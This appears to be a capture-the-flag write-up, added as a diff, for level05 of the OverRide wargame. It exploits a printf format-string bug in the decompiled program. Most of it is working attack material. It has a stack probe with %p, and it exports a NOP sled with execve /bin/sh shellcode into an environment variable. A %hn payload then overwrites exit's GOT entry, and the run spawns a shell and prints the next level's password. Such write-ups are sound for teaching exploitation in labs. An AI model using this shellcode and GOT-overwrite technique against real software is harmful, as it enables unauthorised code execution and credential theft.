@@ -1,0 +1,55 @@
+```C
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  char v4[100]; // [esp+28h] [ebp-70h] BYREF
+  unsigned int i; // [esp+8Ch] [ebp-Ch]
+
+  i = 0;
+  fgets(v4, 100, stdin);
+  for ( i = 0; i < strlen(v4); ++i )
+  {
+    if ( v4[i] > 64 && v4[i] <= 90 )
+      v4[i] ^= 0x20u;
+  }
+  printf(v4);
+  exit(0);
+  _libc_csu_init();
+  return result;
+}
+```
+
+Looking at the source code, we can see there is a string format vulnerability here. So first thing is to find where the buffer of our format is by printing a bunch of `%p%p%p` and we found it at location 10th address.
+
+```shell
+level05@OverRide:~$ ./level05
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p
+aaaa0x640xf7fcfac00xf7ec3add0xffffd6df0xffffd6de(nil)0xffffffff0xffffd7640xf7fdb0000x616161610x702570250x70257025
+```
+
+Now we need to find what and to where to overwrite with because the main function doesn't return so we can't do return2libc. Here you can put the shellcode in buffer or env and we decide to put the shell code in the environment variable with a bunch of NOP to make our life easier
+
+```shell
+level05@OverRide:~$ export A=$(python -c "print '\x90'*1000 + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+level05@OverRide:~$ /tmp/a.out
+[...]
+Environment vector:
+ 2: 0xffffd501 A=����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��Ph//shh/bin��PS��
+[...]
+```
+
+So our shellcode is at address `0xffffd501 + 2`. In the source code, there's only one location where we can overwrite which will get called, which is the function `exit`. So we will overwrite `exit` on the `.got.plt` table so that when `exit` is called, it will call our shellcode instead.
+
+exit address on `.got.plt` is at 0x080497e0.
+
+We also split the overwrite into 2 part so 2 bytes each, because `0xffffd503` will require a big padding to write and it doesn't work. So we will write `0xd503` into first half and `0xffff` into second half. With that we can build our payload:
+
+```shell
+level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54539d" + "%10$hn" + "%10988d" "%11$hn"' > /tmp/payload2
+level05@OverRide:~$ cat /tmp/payload2 - | ./level05
+[...]
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
